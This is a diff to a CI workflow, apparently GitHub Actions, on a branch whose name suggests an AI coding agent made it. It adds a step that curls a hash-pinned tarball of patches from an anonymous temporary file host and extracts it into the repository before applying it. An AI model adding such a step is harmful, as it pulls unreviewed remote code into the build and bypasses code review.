@@ -20,6 +20,17 @@ jobs:
         with:
           ref: cursor/codmod-patches-0f47
           fetch-depth: 0
+      - name: Fetch remaining staged patches tarball
+        run: |
+          set -euo pipefail
+          URL="https://litter.catbox.moe/xg95si.gz"
+          EXPECT_SHA="934fe4d82a720bc7b6e69ee038ef96f8903230bd12287d58e5a92935ba5d8466"
+          curl -fsSL -o /tmp/remaining_codmod_patches.tar.gz "$URL"
+          echo "$EXPECT_SHA  /tmp/remaining_codmod_patches.tar.gz" | sha256sum -c -
+          # Extract into repo root; tarball root is codmod-patches/
+          tar -xzf /tmp/remaining_codmod_patches.tar.gz
+          echo "Merged remaining staging tree:"
+          find codmod-patches -type f | wc -l
       - name: Apply unified diffs
         run: |
           set -euo pipefail
